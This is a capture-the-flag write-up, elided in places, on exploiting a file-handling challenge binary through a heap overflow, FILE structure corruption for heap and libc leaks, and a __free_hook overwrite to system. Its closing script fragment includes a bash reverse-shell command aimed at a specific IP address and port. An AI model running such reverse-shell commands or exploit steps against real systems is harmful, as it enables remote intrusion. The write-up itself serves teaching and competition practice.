...
Playing with the chanllenge binary, We will see serveral options such as Open, Read, Write, Close. It looks like this challenge is functionally related to file operations.
...
## The Vulneriblity
By now, everything seems to be OK, no logic error, no UAF, no vulneribility? 
...
if we read /dev/stdin, recall that file\_size[file\_index] is MAX\_ULONGINT, so any read_size will pass the check. it means we can read arbitary length of data into a 0x10 size file\_buffer. Yes! There is a **heap overflow**!
...
With the ability to overwrite FILE structure, we have serveral choices to hijack the control flow, such as overwrite IO\_file\_jump pointer(despite the libc2.24 add the vtable check, we still can achieve this if we can control some field of the FILE structure, see this) or overwrite the input buffer inside the FILE structure. The solution seems to get clear.
...
```
The code above is the FILE structure. we can see there is 8 pointers related to buffering. for the info leak, we first overwrite the last byte of \_IO\_write\_base to 0x00 using paritial overwrite, then close the overwrited FILE structure using fclose(), since fclose() will flush the buffer, all the data from \_IO\_write\_base to \_IO\_write\_ptr will be ouputed into FILE.

But there still something challenging: All the file we opened in the chanllenge is opened in readonly mode, so the techniques we state above will not work because write to a read only file descripter will fail. the solution is overwring file descripter field of FILE structure to 1(stdout) or 2(stderr) first. this will also cause a sidework that all buffer related field will also be overwrited and we can no longer perform a partial overwrite. this stunk us a little while, but quickly we figure out that fread and fseek will try to fix a invalid buffer. so we can use read in the menu to fix the buffer pointers inside the FILE structure. and finally we can perform paritial overwrite to the \_IO\_write\_base and close the file, a heap address will be leaked. 

With the leaked heap address, we can do it again to leak libc address, instead of paritial overwriting  the \_IO\_write\_base, we now need to overwrite the buffer and make it contains a libc address. FILE structure indeed has some libc address, this is not very hard.

### Get a shell

Once we leaked libc address, we have serveral choices to hijack the control flow. I don't want to play with FILE struct vtable so I choose to overwrite the input buffer and make it starts with freehook and ends with somewhere behind the freehook. the way to overwrite input buffer is slightly different(see the libc source code), we need to \_IO\_buf\_base to freehook and \_IO\_buf\_end to somewhere behind the freehook. and then we read this buffer overwrited file, it will read data into the freehook. we overwrite the freehook to system, and close another file with a buffer contains “/bin/sh”, a shell got!
...
Note that, since we closed both stdout and stderr during the leak stage. so after we get /bin/sh running, we need to spawn a reverse shell to get a interactive shell.

### Attack remotely

once we get the local shell, we continue trying to attack remotely. after serveral unsuccessfully try. we suddenly realize that there are something we forgot. the readme file inside the challenge package.
...
What is so called ",pty,ctty,echo=0"? to figure it out, We use a local socat server and try to attack "remotely", then attach the debugger to the challenge process and try to find out why it failed remotely. we found suprisingly that all the '\xff\x7f' are disapper! it seems like the console parses the '\x7f' as delete and "eat" the '\xff'.  this make us crazy for sure because we takes serveral hours to figure out how to escape the '\x7f'. Finally we know the SYNC control character '\x16' can escape that and prevent the character before '\x7f' to be eaten after the contest end. Yes! after the contest end QaQ.

Finally, Thanks angel boy to make this great challenge, it is very fun.
...
writeline(payload2)
_closefile(0)
writeline("bash -c 'bash -i >& /dev/tcp/45.77.195.145/8888 0>&1'")
io.interactive()
``` 
